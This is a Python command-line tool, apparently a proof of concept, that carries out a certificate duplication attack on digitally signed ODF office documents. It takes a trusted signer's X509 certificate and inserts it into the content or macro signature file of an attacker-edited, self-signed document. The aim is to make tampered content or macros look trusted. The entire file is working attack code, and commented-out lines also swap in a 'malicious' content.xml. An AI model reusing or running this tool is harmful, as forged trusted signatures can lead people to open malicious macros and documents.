import tempfile
import zipfile
import shutil
import os
import sys
import argparse
# import xml.etree.ElementTree as ET
import copy
import re
from lxml import etree

def remove_from_zip(zipfname, *filenames):
    tempdir = tempfile.mkdtemp()
    try:
        tempname = os.path.join(tempdir, 'new.zip')
        with zipfile.ZipFile(zipfname, 'r') as zipread:
            with zipfile.ZipFile(tempname, 'w') as zipwrite:
                for item in zipread.infolist():
                    if item.filename not in filenames:
                        data = zipread.read(item.filename)
                        zipwrite.writestr(item, data)
        shutil.move(tempname, zipfname)
    finally:
        shutil.rmtree(tempdir)

# remove_from_zip(sys.argv[1], 'content.xml')

# with zipfile.ZipFile(sys.argv[1], 'a') as z:
#     z.write('malacious_content.xml', 'content.xml')




# with zipfile.ZipFile(sys.argv[1], 'a') as odf_file:
#     myfile = zipfile.ZipFile(sys.argv[1])
#     listoffiles = myfile.infolist()
#     for s in listoffiles:
#         if s.orig_filename == 'META-INF/documentsignatures.xml':
#             bh = myfile.read(s.orig_filename)
#             ds_root = ET.fromstring(bh)
#             print(ds_root)
#             key_info = ds_root.find("./{http://www.w3.org/2000/09/xmldsig#}Signature/{http://www.w3.org/2000/09/xmldsig#}KeyInfo")
#             print(key_info)
#             x509_data = ds_root.find("./{http://www.w3.org/2000/09/xmldsig#}Signature/{http://www.w3.org/2000/09/xmldsig#}KeyInfo/{http://www.w3.org/2000/09/xmldsig#}X509Data")
#             print(x509_data)
#             x509_data_duplicate = copy.deepcopy(x509_data)
#             print(x509_data_duplicate)
#             x509_certificate = x509_data_duplicate.find("./{http://www.w3.org/2000/09/xmldsig#}X509Certificate")
#             x509_certificate.text = trusted_x509_certificate
#             key_info.append(x509_data_duplicate)
#             # remove_from_zip(sys.argv[1], 'META-INF\\documentsignatures.xml')
#             print(ET.tostring(ds_root, encoding='utf8', default_namespace=None).decode('utf8'))
#             odf_file.writestr('META-INF/documentsignatures.xml', ET.tostring(ds_root, encoding='utf8', default_namespace=None).decode('utf8'))

def get_trusted_certificate(trusted_file):
    # unzip file
    with zipfile.ZipFile(trusted_file) as inzip:
        # Iterate the files in the zip
        for inzipinfo in inzip.infolist():
            with inzip.open(inzipinfo) as infile:
                if inzipinfo.filename == 'META-INF/documentsignatures.xml':
                    # Read content from xml and parse xml
                    content = infile.read()
                    ds_root = etree.fromstring(content) 
                    # Get the X509Certifcate element
                    x509_certificate = ds_root.find("./{http://www.w3.org/2000/09/xmldsig#}Signature/{http://www.w3.org/2000/09/xmldsig#}KeyInfo/{http://www.w3.org/2000/09/xmldsig#}X509Data/{http://www.w3.org/2000/09/xmldsig#}X509Certificate")
                    return x509_certificate.text

def execute_signature_duplicate_attack(attack_type, trusted_file, attacker_file, new_file):
    digital_signature_file = 'META-INF/documentsignatures.xml' if attack_type == 'content' else 'META-INF/macrosignatures.xml'
    # unzip orginal_file and open new_file 
    with zipfile.ZipFile(attacker_file) as inzip, zipfile.ZipFile(new_file, "w") as outzip:
        # Iterate the input files
        for inzipinfo in inzip.infolist():
            # Read input file
            with inzip.open(inzipinfo) as infile:
                if inzipinfo.filename == digital_signature_file:
                    # Read content from xml and parse xml
                    content = infile.read()
                    ds_root = etree.fromstring(content)

                    # Get the KeyInfo element
                    key_info = ds_root.find("./{http://www.w3.org/2000/09/xmldsig#}Signature/{http://www.w3.org/2000/09/xmldsig#}KeyInfo")

                    # Get the X509Data element
                    x509_data = ds_root.find("./{http://www.w3.org/2000/09/xmldsig#}Signature/{http://www.w3.org/2000/09/xmldsig#}KeyInfo/{http://www.w3.org/2000/09/xmldsig#}X509Data")
                   
                    # Deep copy the X509Data element
                    x509_data_duplicate = copy.deepcopy(x509_data)

                    # Get the X509Certificate element from the X509Data element
                    x509_certificate = x509_data_duplicate.find("./{http://www.w3.org/2000/09/xmldsig#}X509Certificate")

                    # Get trusted cirtificate from trusted file
                    trusted_x509_certificate = get_trusted_certificate(trusted_file)

                    # Replace the X509Certificate text with the trusted X509 Certificate
                    x509_certificate.text = trusted_x509_certificate

                    # Add the duplicated X509Data element to the KeyInfo element
                    key_info.append(x509_data_duplicate)
                            
                    # Write content to the new zip file
                    outzip.writestr(inzipinfo.filename, etree.tostring(ds_root, encoding='utf8',xml_declaration=True).decode('utf8'))

                    print(f"New file written to {os.getcwd()}/{new_file}")
                else: 
                    # Copy the other files and directories to the new zip file
                    outzip.writestr(inzipinfo, inzip.read(inzipinfo.filename))


# if len(sys.argv) < 2:
#     print("Usage: python3 odf_attack <function> <param_1> <param_2> ... <param_n>")
#     sys.exit(0)


if __name__ == "__main__":
    args = argparse.ArgumentParser(prog='python3 odf_attack.py', formatter_class=argparse.RawDescriptionHelpFormatter, description="Execute certificate duplication attacks on ODF documents \n")
    args.add_argument("--attack_type", choices=['macro', 'content'], required=True, help="can be either 'macro' or 'content'")
    args.add_argument("--trusted_file", required=True, help="odf file that was signed by a trusted entity")
    args.add_argument("--edited_file",  required=True, help="edited odf file that was signed with the attackers self-signed certificate")
    args.add_argument("--output_file",  required=True, help="output file after certificate duplication attack")

    args = args.parse_args() #arguments are now in the args variable

    execute_signature_duplicate_attack(args.attack_type, args.trusted_file, args.edited_file, args.output_file)
    
    # args = sys.argv
    # args[0] = current file
    # args[1] = function name
    # args[2:] = function args : (*unpacked)


    
    # globals()[args[1]](*args[2:])